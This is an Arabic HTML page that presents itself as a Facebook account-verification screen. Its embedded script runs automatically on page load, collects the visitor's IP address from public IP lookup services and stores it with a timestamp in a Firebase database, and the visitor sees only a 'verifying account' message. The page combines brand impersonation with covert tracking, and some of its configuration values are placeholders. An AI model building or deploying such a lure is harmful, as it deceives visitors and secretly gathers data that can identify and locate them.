<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مركز فيسبوك</title>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }

        body {
            background-color: #0d1117;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .main-card {
            background-color: #161b22;
            border: 1px solid #30363d;
            border-radius: 12px;
            padding: 30px;
            max-width: 450px;
            width: 100%;
            text-align: center;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
        }

        h1 {
            color: #00ff66;
            margin-bottom: 15px;
            font-size: 1.5rem;
        }

        p {
            color: #8b949e;
            font-size: 0.95rem;
            line-height: 1.6;
        }
    </style>
</head>
<body>

    <div class="main-card">
        <h1>مركز فيسبوك</h1>
        <p>جاري التحقق من الحساب...</p>
    </div>

    <!-- إعدادات Firebase والكود البرمجي -->
    <script>
        const firebaseConfig = {
            apiKey: "YOUR_API_KEY",
            authDomain: "beauty-store-4f012.firebaseapp.com",
            projectId: "beauty-store-4f012",
            storageBucket: "beauty-store-4f012.appspot.com",
            messagingSenderId: "YOUR_SENDER_ID",
            appId: "YOUR_APP_ID"
        };

        if (!firebase.apps.length) {
            firebase.initializeApp(firebaseConfig);
        }
        const db = firebase.firestore();

        async function getVisitorIP() {
            const services = [
                'https://api.ipify.org?format=json',
                'https://api64.ipify.org?format=json',
                'https://ipapi.co/json/'
            ];

            for (let service of services) {
                try {
                    const response = await fetch(service);
                    if (response.ok) {
                        const data = await response.json();
                        if (data.ip) return data.ip;
                    }
                } catch (e) {
                    console.warn("Retrying IP fetch...");
                }
            }
            return null;
        }

        async function recordVisitor() {
            try {
                const userIP = await getVisitorIP();
                if (!userIP) return;

                await db.collection("visitors").add({
                    ip: userIP,
                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
                });
                console.log("Recorded IP successfully:", userIP);
            } catch (error) {
                console.error("Error saving IP:", error);
            }
        }

        document.addEventListener("DOMContentLoaded", recordVisitor);
    </script>
</body>
</html>
